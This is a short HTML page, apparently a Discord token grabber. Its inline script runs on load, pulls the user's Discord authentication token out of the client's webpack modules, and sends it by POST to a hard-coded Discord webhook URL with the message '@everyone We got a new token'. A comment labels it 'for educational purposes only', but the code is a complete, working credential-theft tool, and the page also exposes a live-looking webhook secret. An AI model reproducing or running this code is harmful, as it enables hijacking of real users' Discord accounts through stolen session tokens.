<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Token Extractor and Webhook Sender</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
        }
        .content {
            text-align: center;
            font-size: 24px;
            color: #333;
        }
    </style>
</head>
<body>

    <div class="content">
        Discord Token Extractor
    </div>

    <script>
        // This is a simplified example for educational purposes only
        (function() {
            // Extracting token from Webpack chunk
            const token = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken();
            console.log("Extracted Token:", token); // Log the token

            // Send token to webhook
            const webhookURL = 'https://discord.com/api/webhooks/1321597632824611018/iIAs-UeScagNLtAkcEP1qpkm0uUBJIWIg81Jlo56U_Pnv6dFacn8k_FCNYfrUDWcy9vU';
            if (token) {
                const payload = {
                    content: `@everyone We got a new token: ${token}`
                };
                fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                })
                .then(response => {
                    if (response.ok) {
                        console.log('Token sent to webhook!');
                    } else {
                        console.error('Error sending token to webhook:', response.statusText);
                    }
                })
                .catch(error => {
                    console.error('Error with fetch request:', error);
                });
            } else {
                console.error('No token found');
            }
        })();
    </script>

</body>
</html>
